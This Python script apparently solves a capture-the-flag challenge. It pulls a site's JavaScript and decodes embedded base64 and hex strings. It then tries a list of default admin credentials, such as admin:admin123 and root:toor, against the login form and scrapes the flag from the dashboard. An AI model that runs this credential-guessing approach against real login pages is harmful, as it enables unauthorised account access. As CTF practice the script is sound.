#!/usr/bin/env python3
"""
Analyze the JavaScript file for hints
"""

import requests
from urllib.parse import urljoin

def get_js_content(base_url):
    """Get the JavaScript file content"""
    js_url = urljoin(base_url, "/static/app.min.js")
    
    try:
        response = requests.get(js_url, timeout=10)
        if response.status_code == 200:
            return response.text
        else:
            print(f"Failed to get JS: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error getting JS: {e}")
        return None

def analyze_js(js_content):
    """Analyze JavaScript content for hints"""
    if not js_content:
        return
    
    print("JavaScript content:")
    print(js_content)
    print("\n" + "="*50 + "\n")
    
    # Look for interesting patterns
    if "flag" in js_content.lower():
        print("*** 'flag' found in JavaScript! ***")
    
    if "hw{" in js_content.lower():
        print("*** Flag pattern found in JavaScript! ***")
    
    if "admin" in js_content.lower():
        print("*** 'admin' found in JavaScript ***")
    
    if "password" in js_content.lower():
        print("*** 'password' found in JavaScript ***")
    
    # Look for base64 or hex patterns
    import re
    
    # Base64 pattern
    b64_matches = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', js_content)
    if b64_matches:
        print("Potential base64 strings found:")
        for match in b64_matches[:5]:  # Show first 5
            print(f"  {match}")
            try:
                import base64
                decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                if decoded and len(decoded) > 3:
                    print(f"    Decoded: {decoded}")
            except:
                pass
    
    # Hex pattern
    hex_matches = re.findall(r'[0-9a-fA-F]{16,}', js_content)
    if hex_matches:
        print("Potential hex strings found:")
        for match in hex_matches[:5]:
            print(f"  {match}")
            try:
                decoded = bytes.fromhex(match).decode('utf-8', errors='ignore')
                if decoded and len(decoded) > 3:
                    print(f"    Decoded: {decoded}")
            except:
                pass

def test_js_hints(base_url):
    """Test any hints found in JavaScript"""
    # If the JS contains authentication logic, we might find credentials
    # Let's also check if there are any hidden endpoints or parameters
    
    common_admin_creds = [
        ("admin", "admin123"),
        ("admin", "password123"),
        ("administrator", "admin"),
        ("root", "toor"),
        ("admin", "secret"),
        ("admin", "admin2024"),
        ("admin", "ctf"),
        ("admin", "flag"),
        ("csbc", "csbc"),
        ("csbc", "admin"),
    ]
    
    login_url = urljoin(base_url, "/login")
    
    print("Testing common admin credentials...")
    for username, password in common_admin_creds:
        try:
            response = requests.post(login_url, data={
                "username": username,
                "password": password
            }, timeout=10, allow_redirects=False)
            
            print(f"Trying {username}:{password} - Status: {response.status_code}")
            
            if response.status_code == 302:
                location = response.headers.get('Location', '')
                print(f"  Redirect to: {location}")
                
                if 'dashboard' in location or 'admin' in location:
                    print("  *** SUCCESS! Following redirect... ***")
                    cookies = response.cookies
                    dashboard_response = requests.get(urljoin(base_url, location), cookies=cookies)
                    print(f"  Dashboard content: {dashboard_response.text}")
                    
                    if "hw{" in dashboard_response.text.lower():
                        print("  *** FLAG FOUND! ***")
                        return dashboard_response.text
                        
        except requests.exceptions.RequestException as e:
            print(f"  Error: {e}")

def main():
    base_url = "https://admin-panel-ctf.onrender.com"
    
    print("=== JavaScript Analysis ===")
    
    # Get and analyze JavaScript
    js_content = get_js_content(base_url)
    analyze_js(js_content)
    
    print("\n" + "="*50 + "\n")
    
    # Test common credentials
    result = test_js_hints(base_url)
    if result and "hw{" in result.lower():
        print("Flag found!")
        import re
        flag_match = re.search(r'hw\{[^}]+\}', result, re.IGNORECASE)
        if flag_match:
            print(f"FLAG: {flag_match.group()}")

if __name__ == "__main__":
    main()